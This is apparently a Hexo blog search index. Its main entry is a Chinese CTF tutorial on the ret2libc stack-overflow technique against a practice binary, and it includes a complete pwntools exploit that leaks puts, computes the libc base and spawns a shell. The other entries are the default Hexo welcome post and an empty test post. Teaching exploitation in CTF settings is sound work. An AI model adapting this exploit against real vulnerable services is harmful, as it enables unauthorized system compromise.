<?xml version="1.0" encoding="utf-8"?>
<search> 
  
  
    
    <entry>
      <title></title>
      <link href="/2024/10/28/ret2glibc%20/"/>
      <url>/2024/10/28/ret2glibc%20/</url>
      
        <content type="html"><![CDATA[<h1 id="ret2glibc"><a href="#ret2glibc" class="headerlink" title="ret2glibc"></a>ret2glibc</h1><h3 id="什么时候要使用ret2libc"><a href="#什么时候要使用ret2libc" class="headerlink" title="什么时候要使用ret2libc:"></a>什么时候要使用ret2libc:</h3><p>1.存在溢出，且溢出范围足够大，可以覆盖到main函数的返回地址，还可以覆盖更远的区域。</p><p>2.存在类似于puts，write这样的打印函数。可以被利用，劫持程序的执行流程后，执行puts,write这样的函数打印一些已经执行过的函数的真实地址，以便我们寻找libc的基地址。</p><h3 id="ret2libc题目的特点："><a href="#ret2libc题目的特点：" class="headerlink" title="ret2libc题目的特点："></a>ret2libc题目的特点：</h3><p>1.开启了NX保护，即数据段不可执行。同时栈也是不可执行的。因此就别想通过写入shellcode再ret2shellcode这样的方法拿shell。</p><p>2.程序本身也没有像system(“&#x2F;bin&#x2F;sh”)这样直接的后门函数，因此我们也不要想着直接ret2text这么直接。</p><p>3.程序中可能既没有system函数，又没有”&#x2F;bin&#x2F;sh”字符串，需要我们在libc库中寻找。</p><p><strong>例题ret2libc3_32</strong></p><p>思路</p><table><thead><tr><th>第一步（payload1）</th><th>第二步(payload2)</th></tr></thead><tbody><tr><td>找到system()函数和&#x2F;bin&#x2F;sh字符串在libc中的地址。</td><td>劫持程序的执行流程，让程序执行system(“&#x2F;bin&#x2F;sh”)。</td></tr><tr><td>这两个关键地址都在libc库中</td><td>合理地构造溢出，把main函数的返回地址覆盖为system()函数的地址，并合理实现传参即可。</td></tr></tbody></table><ul><li><strong>函数的真实地址   &#x3D;   基地址   +   偏移地址</strong></li></ul><p>求system()函数和”&#x2F;bin&#x2F;sh”字符串的真实地址</p><ol><li>首先寻找一个函数的真实地址，以puts为例。构造合理的<em><strong>payload1</strong></em>，劫持程序的执行流程，使得程序执行puts(puts@got)打印得到puts函数的真实地址，并重新回到main函数开始的位置。</li><li>找到puts函数的真实地址后，根据其最后三位，可以判断出libc库的版本（本文忽略）。</li><li>根据libc库的版本可以很容易的确定puts函数的偏移地址</li><li>计算基地址。基地址 &#x3D; puts函数的真实地址 - puts函数的偏移地址。</li><li>根据libc函数的版本，很容易确定system函数和”&#x2F;bin&#x2F;sh”字符串在libc库中的偏移地址。</li><li>根据 真实地址 &#x3D; 基地址 + 偏移地址 计算出system函数和”&#x2F;bin&#x2F;sh”字符串的真实地址。</li><li>再次构造合理的<em><strong>payload2</strong></em>，劫持程序的执行流程，劫持到system(“&#x2F;bin&#x2F;sh”)的真实地址，从而拿到shell。</li></ol><p><strong>payload1</strong>：</p><p>构造payload1，使得通过对局部变量的字符数组s输入过量的数据，覆盖了main函数的返回地址，将main函数的返回地址覆盖成了puts的plt表项，并通过合理的对栈的覆盖，实现传参.</p><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line">e = ELF(<span class="string">&quot;./ret2libc3_32&quot;</span>)</span><br><span class="line">libc = ELF(<span class="string">&quot;/lib/i386-linux-gnu/libc.so.6&quot;</span>) <span class="comment">#确定libc库并解析</span></span><br><span class="line">p = process(<span class="string">&quot;./ret2libc3_32&quot;</span>)</span><br><span class="line">puts_plt = e.plt[<span class="string">&#x27;puts&#x27;</span>] <span class="comment">#puts函数的入口地址</span></span><br><span class="line">puts_got = e.got[<span class="string">&#x27;puts&#x27;</span>]  <span class="comment">#puts函数的got表地址</span></span><br><span class="line">start_addr = e.symbols[<span class="string">&#x27;_start&#x27;</span>] <span class="comment">#程序的起始地址</span></span><br><span class="line">payload1 = <span class="string">b&#x27;a&#x27;</span> * <span class="number">112</span> + p32(puts_plt) + p32(start_addr) + p32(puts_got)</span><br><span class="line"><span class="comment">#attach(p, &quot;b *0x0804868F&quot;) #这两行注释用于调试程序，读者可以用gdb看看程序的执行过程，断点设置在了gets之前</span></span><br><span class="line"><span class="comment">#pause()</span></span><br><span class="line">p.sendlineafter(<span class="string">&quot;Can you find it !?&quot;</span>, payload1)</span><br><span class="line">puts_real_addr = u32(p.recv()[<span class="number">0</span>:<span class="number">4</span>])  <span class="comment">#接收puts的真实地址，占4个字节</span></span><br><span class="line"><span class="built_in">print</span>(<span class="string">&quot;puts_plt:&#123;&#125;, puts_got: &#123;&#125;, start_addr: &#123;&#125;&quot;</span>.<span class="built_in">format</span>(<span class="built_in">hex</span>(puts_plt),<span class="built_in">hex</span>(puts_got), <span class="built_in">hex</span>(start_addr)))</span><br><span class="line"><span class="built_in">print</span>(<span class="string">&quot;puts_real_addr: &quot;</span>, <span class="built_in">hex</span>(puts_real_addr))</span><br></pre></td></tr></table></figure><p><strong>payload2</strong>:</p><p>  <strong>得到了puts函数的真实地址</strong>，对比两次的运行结果可以发现，两次运行的真实地址是不同的，这是因为基地址不同（地址随机化的保护机制），但<strong>最后三位却是一致的c40</strong>，可以据此<strong>找到libc的版本</strong>（当然本文仅仅打本地，已经确定了libc，就省略了LibcSearcher的步骤）。下接下来就是计算libc的基地址了。<br><strong>基地址 &#x3D; 真实地址  -  偏移地址</strong></p><figure class="highlight python"><table><tr><td class="code"><pre><span class="line">libc_addr = puts_real_addr - libc.sym[<span class="string">&#x27;puts&#x27;</span>]</span><br><span class="line"><span class="built_in">print</span>(<span class="built_in">hex</span>(libc_addr))</span><br></pre></td></tr></table></figure><p>有了基地址libc_addr，我们就可以寻找system函数和”&#x2F;bin&#x2F;sh”字符串的真实地址了：</p><figure class="highlight python"><table><tr><td class="code"><pre><span class="line">system_addr = libc_addr + libc.sym[<span class="string">&quot;system&quot;</span>]</span><br><span class="line">binsh_addr = libc_addr + <span class="built_in">next</span>(libc.search(<span class="string">b&quot;/bin/sh&quot;</span>))</span><br></pre></td></tr></table></figure><p>payload2的原理就是让main函数的返回地址是system函数的真实地址，其后接任意一个4字节长度的数据，占位，表示system函数的返回地址（是啥不重要，因为执行了system(“&#x2F;bin&#x2F;sh”)之后就拿到shell了，我管他返回到哪里），再后面跟着system函数的参数，也就是”&#x2F;bin&#x2F;sh”字符串的真实地址即可：</p><figure class="highlight python"><table><tr><td class="code"><pre><span class="line">payload2 = <span class="string">b&#x27;a&#x27;</span> * <span class="number">112</span> + p32(system_addr) + <span class="string">b&quot;aaaa&quot;</span> + p32(binsh_addr)</span><br><span class="line"><span class="comment">#pause()</span></span><br><span class="line">p.sendline(payload2)</span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure><p>完整exp：</p><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line">e = ELF(<span class="string">&quot;./ret2libc3_32&quot;</span>)</span><br><span class="line">libc = ELF(<span class="string">&quot;/lib/i386-linux-gnu/libc.so.6&quot;</span>) <span class="comment">#确定libc库并解析</span></span><br><span class="line">p = process(<span class="string">&quot;./ret2libc3_32&quot;</span>)</span><br><span class="line">puts_plt = e.plt[<span class="string">&#x27;puts&#x27;</span>] <span class="comment">#puts函数的入口地址</span></span><br><span class="line">puts_got = e.got[<span class="string">&#x27;puts&#x27;</span>]  <span class="comment">#puts函数的got表地址</span></span><br><span class="line">start_addr = e.symbols[<span class="string">&#x27;_start&#x27;</span>] <span class="comment">#程序的起始地址</span></span><br><span class="line">payload1 = <span class="string">b&#x27;a&#x27;</span> * <span class="number">112</span> + p32(puts_plt) + p32(start_addr) + p32(puts_got)</span><br><span class="line"><span class="comment">#attach(p, &quot;b *0x0804868F&quot;)</span></span><br><span class="line"><span class="comment">#pause()</span></span><br><span class="line">p.sendlineafter(<span class="string">&quot;Can you find it !?&quot;</span>, payload1)</span><br><span class="line">puts_real_addr = u32(p.recv()[<span class="number">0</span>:<span class="number">4</span>])  <span class="comment">#接收puts的真实地址，占4个字节</span></span><br><span class="line"><span class="built_in">print</span>(<span class="string">&quot;puts_plt:&#123;&#125;, puts_got: &#123;&#125;, start_addr: &#123;&#125;&quot;</span>.<span class="built_in">format</span>(<span class="built_in">hex</span>(puts_plt),<span class="built_in">hex</span>(puts_got), <span class="built_in">hex</span>(start_addr)))</span><br><span class="line"><span class="built_in">print</span>(<span class="string">&quot;puts_real_addr: &quot;</span>, <span class="built_in">hex</span>(puts_real_addr)) </span><br><span class="line">libc_addr = puts_real_addr - libc.sym[<span class="string">&#x27;puts&#x27;</span>] <span class="comment">#计算libc库的基地址</span></span><br><span class="line"><span class="built_in">print</span>(<span class="built_in">hex</span>(libc_addr))</span><br><span class="line">system_addr = libc_addr + libc.sym[<span class="string">&quot;system&quot;</span>] <span class="comment">#计算system函数的真实地址</span></span><br><span class="line">binsh_addr = libc_addr + <span class="built_in">next</span>(libc.search(<span class="string">b&quot;/bin/sh&quot;</span>))  <span class="comment">#计算binsh字符串的真实地址</span></span><br><span class="line">payload2 = <span class="string">b&#x27;a&#x27;</span> * <span class="number">112</span> + p32(system_addr) + <span class="string">b&quot;aaaa&quot;</span> + p32(binsh_addr)</span><br><span class="line"><span class="comment">#pause()</span></span><br><span class="line">p.sendline(payload2)</span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure><p>参考csdn链接：<a href="https://blog.csdn.net/Bossfrank/article/details/134872403">pwn入门：基本栈溢出之ret2libc详解（以32位+64位程序为例）-CSDN博客</a></p>]]></content>
      
      
      
    </entry>
    
    
    
    <entry>
      <title>Hello World</title>
      <link href="/2024/10/28/hello-world/"/>
      <url>/2024/10/28/hello-world/</url>
      
        <content type="html"><![CDATA[<p>Welcome to <a href="https://hexo.io/">Hexo</a>! This is your very first post. Check <a href="https://hexo.io/docs/">documentation</a> for more info. If you get any problems when using Hexo, you can find the answer in <a href="https://hexo.io/docs/troubleshooting.html">troubleshooting</a> or you can ask me on <a href="https://github.com/hexojs/hexo/issues">GitHub</a>.</p><h2 id="Quick-Start"><a href="#Quick-Start" class="headerlink" title="Quick Start"></a>Quick Start</h2><h3 id="Create-a-new-post"><a href="#Create-a-new-post" class="headerlink" title="Create a new post"></a>Create a new post</h3><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">$ hexo new <span class="string">&quot;My New Post&quot;</span></span><br></pre></td></tr></table></figure><p>More info: <a href="https://hexo.io/docs/writing.html">Writing</a></p><h3 id="Run-server"><a href="#Run-server" class="headerlink" title="Run server"></a>Run server</h3><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">$ hexo server</span><br></pre></td></tr></table></figure><p>More info: <a href="https://hexo.io/docs/server.html">Server</a></p><h3 id="Generate-static-files"><a href="#Generate-static-files" class="headerlink" title="Generate static files"></a>Generate static files</h3><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">$ hexo generate</span><br></pre></td></tr></table></figure><p>More info: <a href="https://hexo.io/docs/generating.html">Generating</a></p><h3 id="Deploy-to-remote-sites"><a href="#Deploy-to-remote-sites" class="headerlink" title="Deploy to remote sites"></a>Deploy to remote sites</h3><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">$ hexo deploy</span><br></pre></td></tr></table></figure><p>More info: <a href="https://hexo.io/docs/one-command-deployment.html">Deployment</a></p>]]></content>
      
      
      
    </entry>
    
    
    
    <entry>
      <title>测试文章</title>
      <link href="/2024/10/27/%E6%B5%8B%E8%AF%95%E6%96%87%E7%AB%A0/"/>
      <url>/2024/10/27/%E6%B5%8B%E8%AF%95%E6%96%87%E7%AB%A0/</url>
      
        <content type="html"><![CDATA[]]></content>
      
      
      
    </entry>
    
    
  
  
</search>
